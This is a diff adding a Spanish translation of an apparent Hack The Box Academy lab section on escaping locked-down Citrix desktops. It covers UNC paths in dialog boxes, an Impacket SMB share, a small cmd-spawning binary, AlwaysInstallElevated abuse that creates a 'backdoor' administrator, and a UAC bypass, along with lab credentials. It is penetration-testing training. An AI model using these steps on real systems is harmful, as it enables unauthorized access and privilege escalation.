@@ -1,0 +1,210 @@
+Numerosas organizaciones aprovechan plataformas de virtualización como Terminal Services, Citrix, AWS AppStream, CyberArk PSM y Kiosk para ofrecer soluciones de acceso remoto con el fin de satisfacer sus requisitos empresariales. Sin embargo, en la mayoría de las organizaciones, se implementan medidas de "lock-down" en sus entornos de escritorio para minimizar el impacto potencial de miembros del personal malintencionados y cuentas comprometidas en la seguridad general del dominio. Si bien estas restricciones de escritorio pueden impedir a los actores de amenazas, sigue existiendo la posibilidad de que puedan "break-out" del entorno restringido.
+
+---
+
+Metodología básica para el break-out:
+
+1. Obtener acceso a un `Dialog Box`.
+2. Explotar el Dialog Box para lograr la `command execution`.
+3. `Escalar privilegios` para obtener niveles más altos de acceso.
+
+---
+
+En ciertos entornos, donde se implementan medidas mínimas de endurecimiento, incluso puede haber un acceso directo estándar a `cmd.exe` en el Menú de Inicio, lo que podría ayudar en el acceso no autorizado. Sin embargo, en un entorno altamente restrictivo de "lock-down", cualquier intento de localizar "cmd.exe" o "powershell.exe" en el menú de inicio no dará resultados. Del mismo modo, acceder a `C:\Windows\system32` a través del Explorador de archivos desencadenará un error, impidiendo el acceso directo a utilidades críticas del sistema. Adquirir acceso al "CMD/Command Prompt" en un entorno tan restringido representa un logro notable, ya que proporciona un control extenso sobre el Operating System. Este nivel de control permite a un atacante reunir información valiosa, facilitando la posterior escalada de privilegios.
+
+Existen muchas técnicas que pueden utilizarse para romper un entorno Citrix. Esta sección no cubrirá todos los escenarios posibles, pero repasaremos las formas más comunes de realizar un Citrix breakout.
+
+Visita [http://humongousretail.com/remote/](http://humongousretail.com/remote/) usando la sesión RDP del objetivo generado e inicia sesión con las credenciales proporcionadas a continuación. Después de iniciar sesión, haz clic en el `Default Desktop` para obtener el archivo Citrix `launch.ica` para conectarse al entorno restringido.
+
+```r
+Username: pmorgan
+Password: Summer1Summer!
+  Domain: htb.local
+```
+
+---
+
+## Bypass de restricciones de ruta
+
+Cuando intentamos visitar `C:\Users` utilizando el Explorador de archivos, encontramos que está restringido y resulta en un error. Esto indica que se ha implementado una directiva de grupo para restringir a los usuarios de navegar por directorios en la unidad `C:\` usando el Explorador de archivos. En tales escenarios, es posible utilizar ventanas de diálogo de Windows como medio para sortear las restricciones impuestas por la directiva de grupo. Una vez que se obtiene una ventana de diálogo de Windows, el siguiente paso a menudo implica navegar a una ruta de carpeta que contenga ejecutables nativos que ofrezcan acceso a la consola interactiva (por ejemplo: cmd.exe). Por lo general, tenemos la opción de ingresar directamente la ruta de la carpeta en el campo del nombre del archivo para acceder al archivo.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/C_users_restricted.png)
+
+Numerosas aplicaciones de escritorio desplegadas a través de Citrix están equipadas con funcionalidades que les permiten interactuar con archivos en el sistema operativo. Funciones como Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan y Print, generalmente brindan a un atacante la oportunidad de invocar una ventana de diálogo de Windows. Hay múltiples formas de abrir una ventana de diálogo en Windows utilizando herramientas como Paint, Notepad, Wordpad, etc. Cubriremos el uso de `MS Paint` como ejemplo para esta sección.
+
+Ejecuta `Paint` desde el menú de inicio y haz clic en `File > Open` para abrir la ventana de diálogo.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/paint.png)
+
+Con la ventana de diálogo de Windows abierta para paint, podemos ingresar la ruta [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) `\\127.0.0.1\c$\users\pmorgan` en el campo del nombre del archivo, con el tipo de archivo configurado en `All Files` y al presionar enter obtenemos acceso al directorio deseado.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/paint_flag.png)
+
+---
+
+## Acceso a compartir SMB desde el entorno restringido
+
+Teniendo restricciones configuradas, el Explorador de archivos no permite el acceso directo a compartir SMB en la máquina atacante. Sin embargo, al utilizar la ruta UNC dentro de la ventana de diálogo de Windows, es posible eludir esta limitación. Este enfoque puede emplearse para facilitar la transferencia de archivos desde una computadora diferente.
+
+Inicia un servidor SMB desde la máquina atacante utilizando el script `smbserver.py` de Impacket.
+
+```r
+root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+De vuelta en el entorno Citrix, inicia la aplicación "Paint" a través del menú de inicio. Procede a navegar al menú "File" y selecciona "Open", lo que hará que aparezca la ventana de diálogo. Dentro de esta ventana de diálogo de Windows asociada con Paint, ingresa la ruta UNC como `\\10.13.38.95\share` en el campo designado "File name". Asegúrate de que el parámetro File-Type esté configurado en "All Files". Al presionar la tecla "Enter", se logra la entrada al compartir.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/paint_share.png)
+
+Debido a la presencia de restricciones dentro del Explorador de archivos, la copia directa de archivos no es viable. No obstante, un enfoque alternativo implica `right-clicking` en los ejecutables y posteriormente iniciarlos. Haz clic derecho en el binario `pwn.exe` y selecciona `Open`, lo que debería solicitarnos ejecutarlo y se abrirá una consola cmd.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/pwn_cmd.png)
+
+El ejecutable `pwn.exe` es un binario compilado personalizado a partir del archivo `pwn.c` que, al ejecutarse, abre el cmd.
+
+```r
+#include <stdlib.h>
+int main() {
+  system("C:\\Windows\\System32\\cmd.exe");
+}
+```
+
+Luego, podemos usar el acceso cmd obtenido para copiar archivos del compartir SMB al directorio del escritorio de pmorgan.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/xcopy.png)
+
+---
+
+## Alternativa Explorer
+
+En casos donde se imponen restricciones estrictas en el Explorador de archivos, se pueden emplear Editores del Sistema de Archivos alternativos como `Q-Dir` o `Explorer++` como una solución. Estas herramientas pueden eludir las restricciones de carpetas impuestas por la directiva de grupo, permitiendo a los usuarios navegar y acceder a archivos y directorios que de otro modo estarían restringidos dentro del entorno estándar del Explorador de archivos.
+
+Vale la pena mencionar la incapacidad previa del Explorador de archivos para copiar archivos desde el compartir SMB debido a las restricciones en vigor. Sin embargo, mediante la utilización de `Explorer++`, se ha demostrado con éxito la capacidad de copiar archivos desde la ubicación `\\10.13.38.95\share` al escritorio perteneciente al usuario `pmorgan` en la siguiente captura de pantalla.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/Explorer++.png)
+
+[Explorer++](https://explorerplusplus.com/) es altamente recomendable y se usa frecuentemente en tales situaciones debido a su velocidad, interfaz fácil de usar y portabilidad. Siendo una aplicación portátil, puede ejecutarse directamente sin necesidad de instalación, lo que la convierte en una opción conveniente para eludir las restricciones de carpetas establecidas por la directiva de grupo.
+
+---
+
+## Editores del Registro Alternativos
+
+![Image](https://academy.hackthebox.com/storage/modules/67/smallregistry.png)
+
+De manera similar, cuando el Registro Editor predeterminado está bloqueado por la directiva de grupo, se pueden emplear editores de registro alternativos para eludir las restricciones estándar de la directiva de grupo. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) y [SmallRegistryEditor](https://sourceforge.net/projects/sre/) son ejemplos de herramientas GUI que facilitan la edición del registro de Windows sin verse afectadas por el bloqueo impuesto por la directiva de grupo. Estas herramientas ofrecen una solución práctica y efectiva para administrar configuraciones del registro en entornos restringidos.
+
+---
+
+## Modificar archivo de acceso directo existente
+
+El acceso no autorizado a rutas de carpetas también se puede lograr modificando accesos directos de Windows existentes y configurando la ruta del ejecutable deseado en el campo `Target`.
+
+Los siguientes pasos describen el proceso:
+
+1. `Right-click` en el acceso directo deseado.
+2. Selecciona `Properties`. 
+    ![Image](https://academy.hackthebox.com/storage/modules/67/shortcut_1.png)
+3. Dentro del campo `Target`, modifica la ruta a la carpeta deseada para acceder. 
+    ![Image](https://academy.hackthebox.com/storage/modules/67/shortcut_2.png)
+4. Ejecuta el acceso directo y se iniciará el cmd 
+    ![Image](https://academy.hackthebox.com/storage/modules/67/shortcut_3.png)
+
+En casos donde no se dispone de un archivo de acceso directo existente, se pueden considerar métodos alternativos. Una opción es transferir un archivo de acceso directo existente utilizando un servidor SMB. Alternativamente, podemos
+
+ crear un nuevo archivo de acceso directo utilizando PowerShell como se menciona en la sección [Interacting with Users](https://academy.hackthebox.com/module/67/section/630) en la pestaña `Generating a Malicious .lnk File`. Estos enfoques proporcionan versatilidad para lograr nuestros objetivos al trabajar con archivos de acceso directo.
+
+---
+
+## Ejecución de Scripts
+
+Cuando las extensiones de script como `.bat`, `.vbs` o `.ps` están configuradas para ejecutar automáticamente su código utilizando sus respectivos intérpretes, se abre la posibilidad de dejar caer un script que pueda servir como una consola interactiva o facilitar la descarga y el lanzamiento de varias aplicaciones de terceros, lo que resulta en el bypass de las restricciones en vigor. Esta situación crea una posible vulnerabilidad de seguridad donde los actores malintencionados podrían explotar estas características para ejecutar acciones no autorizadas en el sistema.
+
+1. Crea un nuevo archivo de texto y nómbralo "evil.bat".
+2. Abre "evil.bat" con un editor de texto como Notepad.
+3. Ingresa el comando "cmd" en el archivo.
+    ![Image](https://academy.hackthebox.com/storage/modules/67/script_bat.png)
+4. Guarda el archivo.
+
+Al ejecutar el archivo "evil.bat", se iniciará una ventana de Command Prompt. Esto puede ser útil para realizar varias operaciones en la línea de comandos.
+
+---
+
+## Escalar Privilegios
+
+Una vez que se establece el acceso al command prompt, es posible buscar vulnerabilidades en un sistema más fácilmente. Por ejemplo, herramientas como [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) y [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) también pueden emplearse para identificar posibles problemas de seguridad y vulnerabilidades dentro del Operating System.
+
+Usando `PowerUp.ps1`, encontramos que la clave [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) está presente y configurada.
+
+También podemos validar esto utilizando el Command Prompt consultando las claves de registro correspondientes.
+
+```r
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+		AlwaysInstallElevated    REG_DWORD    0x1
+
+
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+		AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+Una vez más, podemos hacer uso de PowerUp, utilizando su función `Write-UserAddMSI`. Esta función facilita la creación de un archivo `.msi` directamente en el escritorio.
+
+```r
+PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
+PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
+	
+Output Path
+-----------
+UserAdd.msi
+```
+
+Ahora podemos ejecutar `UserAdd.msi` y crear un nuevo usuario `backdoor:T3st@123` en el grupo Administrators. Ten en cuenta que darle una contraseña que no cumpla con los criterios de complejidad de la contraseña generará un error.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/useradd.png)
+
+De vuelta en CMD, ejecuta `runas` para iniciar el command prompt como el nuevo usuario `backdoor`.
+
+```r
+C:\> runas /user:backdoor cmd
+
+Enter the password for backdoor: T3st@123
+Attempting to start cmd as user "VDESKTOP3\backdoor" ...
+```
+
+---
+
+## Bypass de UAC
+
+A pesar de que el nuevo usuario `backdoor` es miembro del grupo `Administrators`, acceder al directorio `C:\users\Administrator` sigue siendo inviable debido a la presencia del User Account Control (UAC). UAC es un mecanismo de seguridad implementado en Windows para proteger el sistema operativo de cambios no autorizados. Con UAC, cada aplicación que requiere el token de acceso de administrador debe solicitar el consentimiento del usuario final.
+
+```r
+C:\Windows\system32> cd C:\Users\Administrator
+
+Access is denied.
+```
+
+Existen numerosos scripts de [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC), diseñados para ayudar a eludir el mecanismo activo de User Account Control (UAC). Estos scripts ofrecen métodos para navegar más allá de las restricciones de UAC y obtener privilegios elevados.
+
+```r
+PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
+PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
+```
+
+![Image](https://academy.hackthebox.com/storage/modules/67/bypass_uac.png)
+
+Después de un bypass exitoso de UAC, se abrirá una nueva ventana de PowerShell con privilegios más altos y podemos confirmarlo utilizando el comando `whoami /all` o `whoami /priv`. Este comando proporciona una vista completa de los privilegios del usuario actual. Y ahora podemos acceder al directorio de Administrator.
+
+![Image](https://academy.hackthebox.com/storage/modules/67/flag.png)
+
+Nota: Espera 5 minutos después de generar el objetivo. Ignora el mensaje de licencia.
